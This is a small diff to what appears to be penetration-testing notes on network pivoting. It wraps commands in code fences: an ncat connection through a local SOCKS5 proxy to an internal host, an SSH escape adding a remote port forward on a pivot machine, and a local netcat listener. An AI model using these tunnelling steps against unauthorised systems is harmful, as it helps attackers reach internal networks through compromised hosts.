@@ -207,13 +207,16 @@ ncat --proxy 127.0.0.1:9050 --proxy-type socks5 10.112.3.88 7000
 
 On pivot 1
 
+```
 ~C
 -R10.112.3.199:XXX:127.0.0.1:8000
-
+```
 
 Locally
 
+```
 nc -klvp 8000
+```
 
 </details>
 
